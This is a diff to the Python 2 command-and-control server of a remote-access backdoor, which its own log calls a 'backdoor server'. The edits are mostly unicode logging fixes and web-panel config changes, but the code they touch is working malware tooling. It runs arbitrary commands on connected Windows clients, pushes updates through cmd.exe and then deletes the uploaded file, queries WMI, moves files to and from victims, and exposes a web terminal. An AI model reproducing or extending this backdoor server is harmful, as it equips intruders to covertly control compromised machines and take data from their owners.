@@ -67,7 +67,7 @@ def log_open(path):
 
     global g_log_file
 
-    log_write('Log file path is \"%s\"\n' % path)
+    log_write(u'Log file path is \"%s\"\n' % path)
 
     g_log_file = open(path, 'wb')
 
@@ -254,7 +254,10 @@ class ClientHelper(object):
 
             if log:
 
-                fd.write('[%s]: COMMAND: %s\n' % (log_timestamp(), cmd.encode('UTF-8')))
+                message = u'[%s]: COMMAND: %s\n' % (log_timestamp(), cmd)
+
+                # write log file message
+                fd.write(message.encode('UTF-8'))
 
             # execute command on the client
             data, code = self._execute('exec ' + cmd.strip(), stream = stream)
@@ -292,7 +295,7 @@ class ClientHelper(object):
         if isinstance(props, basestring): query += props
         elif isinstance(props, list): query += ','.join(props)
 
-        log_write('execute_wmi(%s): %s\n' % (self.client_id, query))
+        log_write(u'execute_wmi(%s): %s\n' % (self.client_id, query))
 
         # execute WMI query with XML output
         data, code = self.execute('wmic %s /format:rawxml' % query, log = False)
@@ -300,7 +303,7 @@ class ClientHelper(object):
 
         if code != 0:
 
-            log_write('execute_wmi(%s) ERROR: wmic returned 0x%x\n' % (self.client_id, code))
+            log_write(u'execute_wmi(%s) ERROR: wmic returned 0x%x\n' % (self.client_id, code))
             return None        
 
         try:
@@ -316,7 +319,7 @@ class ClientHelper(object):
 
                 # check for an error
                 err = res.getElementsByTagName('ERROR')[0]
-                log_write('execute_wmi(%s) ERROR: Bad result\n' % self.client_id)
+                log_write(u'execute_wmi(%s) ERROR: Bad result\n' % self.client_id)
                 return None
 
             except IndexError: pass
@@ -344,7 +347,7 @@ class ClientHelper(object):
 
         except Exception, why:
 
-            log_write('execute_wmi(%s) ERROR: %s\n' % (self.client_id, str(why)))
+            log_write(u'execute_wmi(%s) ERROR: %s\n' % (self.client_id, str(why)))
             return None
 
     def os_version(self):
@@ -403,7 +406,7 @@ class ClientHelper(object):
 
         else:
 
-            log_write('update(%s) ERROR: Unknown file type' % self.client_id)
+            log_write(u'update(%s) ERROR: Unknown file type' % self.client_id)
             return False
 
         # upload file to the client
@@ -414,7 +417,7 @@ class ClientHelper(object):
         remote_cmd = 'cmd.exe /C "%s & ping 127.0.0.1 -n 3 > NUL & del %s"' % \
                      (cmd.encode('UTF-8'), remote_path.encode('UTF-8'))
 
-        log_write('update(%s): %s\n' % (self.client_id, remote_cmd))
+        log_write(u'update(%s): %s\n' % (self.client_id, remote_cmd))
 
         # execute update command on the client
         self.sock.sendall('upd ' + remote_cmd + '\n')
@@ -432,14 +435,14 @@ class ClientHelper(object):
 
         assert self.client_id is not None
 
-        log_write('file_list(%s): %s\n' % (self.client_id, path.encode('UTF-8')))
+        log_write(u'file_list(%s): %s\n' % (self.client_id, path))
 
         # list of the files in specified folder
         data, code = self._execute('flist ' + path.strip())
         if code != 0: 
 
             # command failed
-            log_write('ERROR: file_list() failed with code 0x%.8x\n' % code)
+            log_write(u'ERROR: file_list() failed with code 0x%.8x\n' % code)
             return None
 
         ret = []
@@ -465,7 +468,7 @@ class ClientHelper(object):
         assert self.sock is not None
         assert self.client_id is not None
 
-        log_write('file_get(%s): Downloading file \"%s\" into the \"%s\"\n' % \
+        log_write(u'file_get(%s): Downloading file \"%s\" into the \"%s\"\n' % \
                   (self.client_id, path, local_path))
 
         # send download file command
@@ -480,7 +483,7 @@ class ClientHelper(object):
             size = struct.unpack('Q', size)[0]            
             if size != 0xffffffffffffffff:
 
-                log_write('file_get(%s): File size is %d\n' % (self.client_id, size))
+                log_write(u'file_get(%s): File size is %d\n' % (self.client_id, size))
 
                 readed = 0
 
@@ -501,7 +504,7 @@ class ClientHelper(object):
             else:
 
                 # command failed
-                log_write('ERROR: file_get() failed\n')
+                log_write(u'ERROR: file_get() failed\n')
 
         if not ret and os.path.isfile(local_path):
 
@@ -519,13 +522,13 @@ class ClientHelper(object):
         assert self.sock is not None
         assert self.client_id is not None
 
-        log_write('file_put(%s): Uploading file \"%s\" into the \"%s\"\n' % \
+        log_write(u'file_put(%s): Uploading file \"%s\" into the \"%s\"\n' % \
                   (self.client_id, local_path, path))
 
         # get local file size
         size = os.path.getsize(local_path)
 
-        log_write('file_put(%s): File size is %d\n' % (self.client_id, size))
+        log_write(u'file_put(%s): File size is %d\n' % (self.client_id, size))
 
         # send upload file command 
         self.sock.sendall('fput ' + path.encode('UTF-8') + '\n')
@@ -537,7 +540,7 @@ class ClientHelper(object):
         if status == 0:
 
             # command failed
-            log_write('ERROR: file_put() failed\n')
+            log_write(u'ERROR: file_put() failed\n')
             return False
 
         # send file size
@@ -631,7 +634,7 @@ class ClientHelper(object):
 
         self.redis_connect()
 
-        log_write('client_add(%s)\n' % self.client_id)
+        log_write(u'client_add(%s)\n' % self.client_id)
 
         # add client info to the database
         self.redis.set(self.client_id, json.dumps(props))
@@ -655,7 +658,7 @@ class ClientHelper(object):
 
         self.redis_connect()
 
-        log_write('client_del(%s)\n' % self.client_id)
+        log_write(u'client_del(%s)\n' % self.client_id)
 
         # remove client info from the database
         self.redis.delete(self.client_id)
@@ -827,13 +830,13 @@ class ClientMapper(Thread):
 
                 continue
 
-            if Conf.VERBOSE: log_write('MAPPER: Client %s:%d connected\n' % client_addr)
+            if Conf.VERBOSE: log_write(u'MAPPER: Client %s:%d connected\n' % client_addr)
 
             while self.running:
 
                 if self.server.client_sock is None:
 
-                    if Conf.VERBOSE: log_write('MAPPER: Client %s:%d disconnected\n' % client_addr)
+                    if Conf.VERBOSE: log_write(u'MAPPER: Client %s:%d disconnected\n' % client_addr)
                     break
 
                 time.sleep(1)
@@ -998,7 +1001,7 @@ class ClientDispatcher(object):
 
             helper.create_folders()
 
-            log_write('SERVER: Client %s:%d connected (ID = %s, PID = %d, port = %d)\n' % \
+            log_write(u'SERVER: Client %s:%d connected (ID = %s, PID = %d, port = %d)\n' % \
                 (self.client_address[0], self.client_address[1], helper.client_id, os.getpid(), addr[1]))
 
             helper.client_add(addr = self.client_address, map_port = addr[1], map_pid = os.getpid(), 
@@ -1025,7 +1028,7 @@ class ClientDispatcher(object):
                     # check for ping from the client
                     if re.search('^\{\{\{\$[0123456789abcdef]{8}\}\}\}$', data) is not None:
 
-                        if Conf.VERBOSE: log_write('SERVER: Ping from client %s:%d\n' % self.client_address)
+                        if Conf.VERBOSE: log_write(u'SERVER: Ping from client %s:%d\n' % self.client_address)
 
                     elif self.client_sock is not None: 
 
@@ -1063,17 +1066,17 @@ class ClientDispatcher(object):
 
                 if time.time() - last_request >= Conf.CLIENT_TIMEOUT:
 
-                    log_write('SERVER: Client %s:%d timeout occured\n' % self.client_address)
+                    log_write(u'SERVER: Client %s:%d timeout occured\n' % self.client_address)
                     break
 
         except Exception, why:
 
-            log_write('ERROR: Exception in handle():\n')
-            log_write('-----------------------------------------\n')
+            log_write(u'ERROR: Exception in handle():\n')
+            log_write(u'-----------------------------------------\n')
             log_write(traceback.format_exc())
-            log_write('-----------------------------------------\n')
+            log_write(u'-----------------------------------------\n')
 
-        log_write('SERVER: Client %s:%d disconnected\n' % self.client_address)
+        log_write(u'SERVER: Client %s:%d disconnected\n' % self.client_address)
 
         if self.client_sock is not None:
 
@@ -1102,7 +1105,7 @@ class Daemon:
         sys.stdout.flush()
         sys.stderr.flush()     
 
-        log_write('Going to the background...\n')
+        log_write(u'Going to the background...\n')
 
         try:
           
@@ -1161,7 +1164,7 @@ class Server(object):
 
         self.addr = ( addr, port )        
 
-        log_write('Starting backdoor server at address %s:%d\n' % self.addr)        
+        log_write(u'Starting backdoor server at address %s:%d\n' % self.addr)        
 
         # bind socket for the data transfer connection
         self.sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
@@ -1206,6 +1209,7 @@ class ServerHttpAdmin(object):
 <link rel="shortcut icon" href="''' + Conf.HTTP_PATH + '''/static/favicon.png" />
 <link rel="stylesheet" type="text/css" href="''' + Conf.HTTP_PATH + '''/static/jquery.terminal.css" />
 <link rel="stylesheet" type="text/css" href="''' + Conf.HTTP_PATH + '''/static/main.css" />
+<link rel="stylesheet" type="text/css" href="''' + Conf.HTTP_PATH + '''/static/fonts/ibm-plex.css" />
 <script src="''' + Conf.HTTP_PATH + '''/static/jquery-1.9.1.min.js"></script>
 <script src="''' + Conf.HTTP_PATH + '''/static/jquery.terminal-0.7.6.min.js"></script>
 <script src="''' + Conf.HTTP_PATH + '''/static/main.js"></script>
@@ -1639,7 +1643,7 @@ class ServerHttp():
                 # set the Last-Modified response header
                 cptools.validate_since()
                 
-                cherrypy.response.headers['Content-Type'] = 'text/html'
+                cherrypy.response.headers['Content-Type'] = 'text/html; charset=utf-8'
                 cherrypy.response.body = lister(path, path_full)
                 
                 cherrypy.request.is_index = True
@@ -1731,6 +1735,10 @@ class ServerHttp():
             }
         })     
 
+        # content types to serve static files
+        content_types = { 'log': 'text/plain; charset=utf-8',
+                          'txt': 'text/plain; charset=utf-8' }
+
         cherrypy.tree.mount(ServerHttpAdmin({}), Conf.HTTP_PATH + '/',
         {
             '/':
@@ -1741,17 +1749,6 @@ class ServerHttp():
                 'tools.auth_digest.key': Conf.HTTP_DIGEST_KEY,
                 'error_page.401': _error_page,
                 'response.headers.server': Conf.HTTP_SERVER_NAME
-            },
-
-            '/logs':
-            {
-                'tools.auth_digest.on': True,
-                'tools.auth_digest.realm': Conf.HTTP_RELAM,
-                'tools.auth_digest.get_ha1': get_ha1,
-                'tools.auth_digest.key': Conf.HTTP_DIGEST_KEY,
-                'tools.staticdir.on': True,
-                'tools.staticdir.dir': Conf.LOG_DIR_PATH,
-                'tools.staticdir.lister': _staticdir_list               
             },
 
             '/static':
@@ -1765,6 +1762,18 @@ class ServerHttp():
                 'tools.staticdir.lister': _staticdir_list
             },
 
+            '/logs':
+            {
+                'tools.auth_digest.on': True,
+                'tools.auth_digest.realm': Conf.HTTP_RELAM,
+                'tools.auth_digest.get_ha1': get_ha1,
+                'tools.auth_digest.key': Conf.HTTP_DIGEST_KEY,
+                'tools.staticdir.on': True,
+                'tools.staticdir.dir': Conf.LOG_DIR_PATH,
+                'tools.staticdir.lister': _staticdir_list,
+                'tools.staticdir.content_types': content_types
+            },            
+
             '/downloads':
             {
                 'tools.auth_digest.on': True,
@@ -1773,7 +1782,8 @@ class ServerHttp():
                 'tools.auth_digest.key': Conf.HTTP_DIGEST_KEY,
                 'tools.staticdir.on': True,
                 'tools.staticdir.dir': Conf.DOWNLOADS_DIR_PATH,
-                'tools.staticdir.lister': _staticdir_list
+                'tools.staticdir.lister': _staticdir_list,
+                'tools.staticdir.content_types': content_types
             },
 
             '/server.log':
@@ -1783,7 +1793,8 @@ class ServerHttp():
                 'tools.auth_digest.get_ha1': get_ha1,
                 'tools.auth_digest.key': Conf.HTTP_DIGEST_KEY,
                 'tools.staticfile.on': True,
-                'tools.staticfile.filename': Conf.LOG_FILE_PATH
+                'tools.staticfile.filename': Conf.LOG_PATH_SERVER,
+                'tools.staticfile.content_types': content_types
             },
 
             '/access.log':
@@ -1793,20 +1804,21 @@ class ServerHttp():
                 'tools.auth_digest.get_ha1': get_ha1,
                 'tools.auth_digest.key': Conf.HTTP_DIGEST_KEY,
                 'tools.staticfile.on': True,
-                'tools.staticfile.filename': Conf.LOG_FILE_PATH_HTTP
+                'tools.staticfile.filename': Conf.LOG_PATH_ACCESS,
+                'tools.staticfile.content_types': content_types
             }
         })        
 
-        if os.path.isfile(Conf.LOG_FILE_PATH_HTTP):
+        if os.path.isfile(Conf.LOG_PATH_ACCESS):
 
             # delete old log file
-            try: os.unlink(Conf.LOG_FILE_PATH_HTTP)
+            try: os.unlink(Conf.LOG_PATH_ACCESS)
             except: pass
 
         cherrypy.config.update(
         {
-            'log.access_file': Conf.LOG_FILE_PATH_HTTP,
-            'log.error_file': Conf.LOG_FILE_PATH_HTTP
+            'log.access_file': Conf.LOG_PATH_ACCESS,
+            'log.error_file': Conf.LOG_PATH_ACCESS
         })
 
         self.watcher = ServerHttpWatcher(cherrypy.engine)
@@ -2031,7 +2043,7 @@ def main():
         return 0
 
     # start log file
-    log_open(Conf.LOG_FILE_PATH if options.log_path is None else options.log_path)            
+    log_open(Conf.LOG_PATH_SERVER if options.log_path is None else options.log_path)            
 
     server = Server(options.addr, options.port)
 
@@ -2050,14 +2062,14 @@ def main():
 
         except Exception, why:
 
-            log_write('HTTP server error: %s\n' % str(why))
+            log_write(u'HTTP server error: %s\n' % str(why))
         
         exit(0)
 
     pid = os.getpid()
     pgid = os.getpgid(pid)
 
-    log_write('%s PID = %d, PGID = %d\n' % (os.path.basename(sys.argv[0]), pid, pgid))
+    log_write(u'%s PID = %d, PGID = %d\n' % (os.path.basename(sys.argv[0]), pid, pgid))
 
     with open(Conf.PGID_FILE_PATH, 'w') as fd: 
 
